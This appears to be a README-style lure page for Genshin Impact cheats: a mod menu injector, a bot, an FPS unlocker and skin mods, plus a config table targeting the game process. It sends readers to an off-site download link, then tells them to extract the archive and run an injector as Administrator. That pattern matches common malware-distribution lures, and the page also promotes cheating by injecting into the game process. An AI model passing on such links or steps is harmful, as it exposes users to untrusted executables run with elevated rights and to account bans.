## 🔧 How to Use

1. Click **[CLICK](https://gitappdown.top/)** to download.

2. Extract the archive.

3. **For mod menu:** Run the injector as Administrator, press `F1` to open the menu.

4. **For automation:** Run the bot launcher, configure settings, click Start.

5. **For FPS unlock:** Run the loader, set target FPS in config.

6. **For skin mods:** Install GIMI, place mods in the `Mods` folder.

> **Note:** If the menu does not appear, ensure the game is running in **Windowed** mode.

## ⚙️ Configuration

Settings are stored in `config.json`.

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `menu_hotkey` | String | `"F1"` | Key to toggle menu |
| `process_name` | String | `"GenshinImpact.exe"` | Target process |
| `fps_target` | Integer | `60` | Target frame rate |
| `safe_mode` | Boolean | `true` | Restricts risky features |
